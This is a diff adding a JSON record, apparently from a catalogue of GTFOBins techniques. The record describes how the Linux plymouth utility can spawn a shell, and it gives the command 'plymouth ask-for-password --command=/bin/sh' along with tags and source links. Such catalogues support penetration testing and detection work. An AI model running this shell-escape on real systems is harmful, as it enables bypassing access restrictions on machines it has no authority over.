@@ -1,0 +1,23 @@
+{
+  "id": "gtfo-plymouth-shell",
+  "name": "GTFOBins · plymouth (shell)",
+  "command": "plymouth ask-for-password --prompt=x --command=/bin/sh",
+  "description": "Use plymouth to shell via GTFOBins.",
+  "platform": "linux",
+  "tags": [
+    "gtfobins",
+    "plymouth",
+    "shell"
+  ],
+  "source": "gtfobins",
+  "source_url": "https://gtfobins.github.io/gtfobins/plymouth/#shell",
+  "upstream_id": "plymouth/shell/0",
+  "category": "gtfobins",
+  "subcategory": "shell",
+  "references": [
+    {
+      "title": "GTFOBins",
+      "url": "https://gtfobins.github.io/gtfobins/plymouth/"
+    }
+  ]
+}
